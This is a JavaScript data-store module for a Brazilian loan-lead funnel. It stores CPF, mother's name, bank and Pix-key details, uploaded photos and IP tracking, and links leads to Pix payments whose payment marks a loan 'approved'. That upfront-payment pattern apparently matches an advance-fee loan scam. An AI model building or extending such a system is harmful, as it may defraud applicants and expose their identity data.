const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

function nowIso() {
  return new Date().toISOString();
}

function uid(prefix) {
  return `${prefix}_${crypto.randomBytes(8).toString('hex')}`;
}

class Store {
  constructor(dataDir) {
    this.dataDir = dataDir;
    this.uploadsDir = path.join(dataDir, 'uploads');
    this.dbFile = path.join(dataDir, 'db.json');
    this.queue = Promise.resolve();
    fs.mkdirSync(this.uploadsDir, { recursive: true });
    if (!fs.existsSync(this.dbFile)) {
      this.writeSync({ leads: [], pix: [] });
    }
  }

  read() {
    try {
      return JSON.parse(fs.readFileSync(this.dbFile, 'utf8'));
    } catch {
      return { leads: [], pix: [] };
    }
  }

  writeSync(db) {
    const tmp = this.dbFile + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
    fs.renameSync(tmp, this.dbFile);
  }

  mutate(fn) {
    this.queue = this.queue.then(() => {
      const db = this.read();
      const result = fn(db);
      this.writeSync(db);
      return result;
    }).catch((err) => {
      console.error('[store]', err);
      throw err;
    });
    return this.queue;
  }

  findLead(db, { visitorId, cpf }) {
    if (visitorId) {
      const byVid = db.leads.find((l) => l.visitorId === visitorId);
      if (byVid) return byVid;
    }
    if (cpf) {
      const digits = String(cpf).replace(/\D/g, '');
      if (digits.length >= 11) {
        return db.leads.find((l) => String(l.cpf || '').replace(/\D/g, '') === digits);
      }
    }
    return null;
  }

  upsertLead(payload) {
    return this.mutate((db) => {
      const fields = payload.fields || {};
      const cpf = fields.cpf || fields.document || payload.cpf;
      let lead = this.findLead(db, { visitorId: payload.visitorId, cpf });
      if (!lead) {
        lead = {
          id: uid('lead'),
          visitorId: payload.visitorId || uid('vid'),
          createdAt: nowIso(),
          updatedAt: nowIso(),
          step: payload.step || '',
          steps: [],
          photos: [],
          nome: '',
          cpf: '',
          nomeMae: '',
          dataNasc: '',
          email: '',
          telefone: '',
          banco: '',
          tipoPix: '',
          chavePix: '',
          valor: '',
          parcelas: '',
          parcelaMensal: '',
          utmSource: '',
          utmMedium: '',
          utmCampaign: '',
          utmContent: '',
          utmTerm: '',
          utmId: '',
          sck: '',
          ttclid: '',
          ip: '',
          ips: [],
          userAgent: '',
          referer: '',
        };
        db.leads.unshift(lead);
      }

      const map = {
        nome: fields.nome || fields.name,
        cpf: fields.cpf || fields.document,
        nomeMae: fields.nome_mae || fields.nomeMae,
        dataNasc: fields.data_nasc || fields.dataNasc,
        email: fields.email,
        telefone: fields.telefone || fields.telephone || fields.phone,
        banco: fields.banco,
        tipoPix: fields.tipo_pix || fields.tipoPix,
        chavePix: fields.chave_pix || fields.chavePix,
        valor: fields.selectedLoanAmount || fields.valor || fields.approvedAmount,
        parcelas: fields.selectedInstallments || fields.parcelas,
        parcelaMensal: fields.selectedMonthlyPayment || fields.parcelaMensal,
        utmSource: fields.utm_source,
        utmMedium: fields.utm_medium,
        utmCampaign: fields.utm_campaign,
        utmContent: fields.utm_content,
        utmTerm: fields.utm_term,
        utmId: fields.utm_id,
        sck: fields.sck,
        ttclid: fields.ttclid,
      };

      for (const [key, value] of Object.entries(map)) {
        if (value !== undefined && value !== null && String(value).trim() !== '') {
          lead[key] = String(value).trim();
        }
      }
      if (payload.visitorId) lead.visitorId = payload.visitorId;
      this.touchNetwork(lead, payload.meta);
      if (payload.step) {
        lead.step = payload.step;
        const last = lead.steps[lead.steps.length - 1];
        if (!last || last.step !== payload.step) {
          lead.steps.push({ step: payload.step, at: nowIso() });
        }
      }
      lead.updatedAt = nowIso();
      return { ...lead };
    });
  }

  touchNetwork(lead, meta) {
    if (!lead || !meta) return;
    const ip = String(meta.ip || '').trim().slice(0, 64);
    if (ip) {
      lead.ip = ip;
      lead.ips = Array.isArray(lead.ips) ? lead.ips : [];
      if (!lead.ips.some((item) => item && item.ip === ip)) {
        lead.ips.unshift({ ip, at: nowIso() });
        lead.ips = lead.ips.slice(0, 12);
      }
    }
    if (meta.userAgent) lead.userAgent = String(meta.userAgent).slice(0, 300);
    if (meta.referer) lead.referer = String(meta.referer).slice(0, 300);
  }

  savePhoto(visitorId, dataUrl, meta) {
    return this.mutate((db) => {
      let lead = this.findLead(db, { visitorId });
      if (!lead) {
        lead = {
          id: uid('lead'),
          visitorId,
          createdAt: nowIso(),
          updatedAt: nowIso(),
          step: 'foto',
          steps: [{ step: 'foto', at: nowIso() }],
          photos: [],
        };
        db.leads.unshift(lead);
      }
      const match = String(dataUrl || '').match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
      if (!match) throw new Error('Imagem inválida');
      const ext = match[1].includes('png') ? 'png' : match[1].includes('webp') ? 'webp' : 'jpg';
      const buf = Buffer.from(match[2], 'base64');
      if (buf.length > 8 * 1024 * 1024) throw new Error('Imagem muito grande');
      const dir = path.join(this.uploadsDir, lead.id);
      fs.mkdirSync(dir, { recursive: true });
      const filename = `${Date.now()}.${ext}`;
      fs.writeFileSync(path.join(dir, filename), buf);
      const photo = {
        file: filename,
        url: `/api/admin/leads/${lead.id}/photos/${filename}`,
        size: buf.length,
        at: nowIso(),
      };
      lead.photos.push(photo);
      lead.step = lead.step || 'foto';
      this.touchNetwork(lead, meta);
      lead.updatedAt = nowIso();
      return { leadId: lead.id, photo };
    });
  }

  savePix(payload) {
    return this.mutate((db) => {
      const lead = this.findLead(db, { visitorId: payload.visitorId, cpf: payload.cpf });
      const rec = {
        id: uid('pix'),
        leadId: lead ? lead.id : null,
        visitorId: payload.visitorId || '',
        type: payload.type || 'create',
        product: payload.product || '',
        page: payload.page || '',
        transactionId: payload.transactionId || '',
        reference: payload.reference || '',
        publicId: payload.publicId || '',
        gateway: payload.gateway || '',
        ip: payload.ip || '',
        qrCode: payload.qrCode || '',
        amount: payload.amount || '',
        status: payload.status || 'pending',
        createdAt: nowIso(),
        updatedAt: nowIso(),
      };
      const ids = [rec.transactionId, rec.reference, rec.publicId].filter(Boolean).map(String);
      const existing = db.pix.find((p) => {
        const pool = [p.transactionId, p.reference, p.publicId].filter(Boolean).map(String);
        return ids.some((id) => pool.includes(id));
      }) || null;
      if (existing) {
        if (rec.qrCode) existing.qrCode = rec.qrCode;
        if (rec.status) existing.status = rec.status;
        if (rec.amount) existing.amount = rec.amount;
        if (rec.product) existing.product = rec.product;
        if (rec.gateway) existing.gateway = rec.gateway;
        if (rec.ip) existing.ip = rec.ip;
        if (rec.reference) existing.reference = rec.reference;
        if (rec.publicId) existing.publicId = rec.publicId;
        if (rec.transactionId) {
          if (!existing.transactionId) existing.transactionId = rec.transactionId;
          else if (String(existing.transactionId) !== String(rec.transactionId)) existing.publicId = rec.transactionId;
        }
        existing.updatedAt = nowIso();
        return { ...existing };
      }
      db.pix.unshift(rec);
      if (lead) {
        this.touchNetwork(lead, { ip: payload.ip, userAgent: payload.userAgent, referer: payload.referer });
        lead.updatedAt = nowIso();
        if (payload.product) {
          const last = lead.steps[lead.steps.length - 1];
          const step = `pix:${payload.product}`;
          if (!last || last.step !== step) lead.steps.push({ step, at: nowIso() });
        }
      }
      return { ...rec };
    });
  }

  brDay(iso) {
    const t = new Date(iso || Date.now());
    if (Number.isNaN(t.getTime())) return '';
    return new Intl.DateTimeFormat('en-CA', { timeZone: 'America/Sao_Paulo' }).format(t);
  }

  uniquePix(db) {
    const unique = [];
    const seen = new Set();
    for (const p of db.pix) {
      const key = p.transactionId || p.id;
      if (seen.has(key)) continue;
      seen.add(key);
      unique.push(p);
    }
    return unique;
  }

  stats() {
    const db = this.read();
    const unique = this.uniquePix(db);
    const paidPix = unique.filter((p) => p.status === 'approved' || p.status === 'paid');
    const paidLeadIds = new Set(paidPix.map((p) => p.leadId).filter(Boolean));
    const withPhoto = db.leads.filter((l) => (l.photos || []).length > 0).length;
    const pixGenerated = unique.length;
    const pixPaid = paidPix.length;
    const today = this.brDay();
    const leadsToday = db.leads.filter((l) => this.brDay(l.createdAt) === today).length;
    const revenueCents = paidPix.reduce((sum, p) => sum + (Number(p.amount) || 0), 0);
    const ipMap = new Map();
    for (const lead of db.leads) {
      if (!lead.ip) continue;
      const row = ipMap.get(lead.ip) || { ip: lead.ip, leads: 0, paid: 0 };
      row.leads += 1;
      if (paidLeadIds.has(lead.id)) row.paid += 1;
      ipMap.set(lead.ip, row);
    }
    const gateways = {};
    for (const pix of unique) {
      const name = pix.gateway || 'flevopay';
      const row = gateways[name] || { gateway: name, generated: 0, paid: 0, revenueCents: 0 };
      row.generated += 1;
      if (pix.status === 'approved' || pix.status === 'paid') {
        row.paid += 1;
        row.revenueCents += Number(pix.amount) || 0;
      }
      gateways[name] = row;
    }
    return {
      leads: db.leads.length,
      leadsToday,
      withPhoto,
      pixGenerated,
      pixPaid,
      revenueCents,
      uniqueIps: ipMap.size,
      repeatedIps: [...ipMap.values()].filter((row) => row.leads > 1).length,
      topIps: [...ipMap.values()].sort((a, b) => b.leads - a.leads || b.paid - a.paid).slice(0, 6),
      gateways: Object.values(gateways),
      approvedCount: paidLeadIds.size,
      pendingCount: Math.max(0, db.leads.length - paidLeadIds.size),
      conversionRate: db.leads.length ? Math.round((paidLeadIds.size / db.leads.length) * 1000) / 10 : 0,
      photoRate: db.leads.length ? Math.round((withPhoto / db.leads.length) * 1000) / 10 : 0,
      pixPayRate: pixGenerated ? Math.round((pixPaid / pixGenerated) * 1000) / 10 : 0,
    };
  }

  leadStatus(lead, pix) {
    const paid = pix.some((p) => p.status === 'approved' || p.status === 'paid');
    if (paid) return 'aprovado';
    if (pix.some((p) => p.transactionId)) return 'pix';
    if ((lead.photos || []).length) return 'analise';
    if (lead.cpf) return 'cadastro';
    return 'novo';
  }

  listLeads(query, status) {
    const db = this.read();
    const q = String(query || '').trim().toLowerCase();
    const ipCounts = {};
    for (const lead of db.leads) {
      if (!lead.ip) continue;
      ipCounts[lead.ip] = (ipCounts[lead.ip] || 0) + 1;
    }
    let rows = db.leads;
    if (q) {
      rows = rows.filter((l) => {
        const blob = [l.nome, l.cpf, l.email, l.telefone, l.chavePix, l.banco, l.step, l.visitorId, l.ip, l.utmSource, l.utmCampaign, l.userAgent]
          .join(' ')
          .toLowerCase();
        return blob.includes(q);
      });
    }
    const mapped = rows.map((l) => {
      const pix = db.pix.filter((p) => p.leadId === l.id || p.visitorId === l.visitorId);
      const paid = pix.filter((p) => p.status === 'approved' || p.status === 'paid');
      const last = pix[0] || null;
      const { photos, ...rest } = l;
      return {
        ...rest,
        photoCount: (photos || []).length,
        pixCount: pix.length,
        paidAmount: paid.reduce((sum, p) => sum + (Number(p.amount) || 0), 0),
        lastPix: last ? { status: last.status, gateway: last.gateway, amount: last.amount, product: last.product, createdAt: last.createdAt } : null,
        ipLeadCount: l.ip ? ipCounts[l.ip] || 1 : 0,
        status: this.leadStatus(l, pix),
      };
    });
    const wanted = String(status || '').trim().toLowerCase();
    if (!wanted || wanted === 'todos') return mapped;
    return mapped.filter((row) => row.status === wanted);
  }

  getLead(id) {
    const db = this.read();
    const lead = db.leads.find((l) => l.id === id);
    if (!lead) return null;
    const pix = db.pix.filter((p) => p.leadId === lead.id || p.visitorId === lead.visitorId);
    return { ...lead, pix, status: this.leadStatus(lead, pix) };
  }

  photoPath(leadId, filename) {
    const safe = path.basename(filename);
    const file = path.join(this.uploadsDir, leadId, safe);
    if (!file.startsWith(this.uploadsDir)) return null;
    if (!fs.existsSync(file)) return null;
    return file;
  }

  pixGateway() {
    const db = this.read();
    const saved = db.settings && db.settings.pixGateway;
    const name = String(saved || process.env.PIX_GATEWAY || 'flevopay').toLowerCase();
    if (name === 'ironpay' || name === 'pixzy') return name;
    return 'flevopay';
  }

  setPixGateway(name) {
    const next = String(name || '').toLowerCase();
    if (next !== 'flevopay' && next !== 'ironpay' && next !== 'pixzy') {
      const err = new Error('Gateway inválido. Use flevopay, ironpay ou pixzy.');
      err.status = 400;
      throw err;
    }
    return this.mutate((db) => {
      db.settings = db.settings || {};
      db.settings.pixGateway = next;
      return { pixGateway: next };
    });
  }

  contextByTransaction(transactionId) {
    const db = this.read();
    const id = String(transactionId || '');
    const pix = db.pix.find((p) =>
      (p.transactionId && String(p.transactionId) === id) ||
      (p.reference && String(p.reference) === id) ||
      (p.publicId && String(p.publicId) === id)
    );
    if (!pix) return { pix: null, lead: null };
    const lead = db.leads.find((l) => l.id === pix.leadId || (pix.visitorId && l.visitorId === pix.visitorId)) || null;
    return { pix, lead };
  }
}

module.exports = { Store };
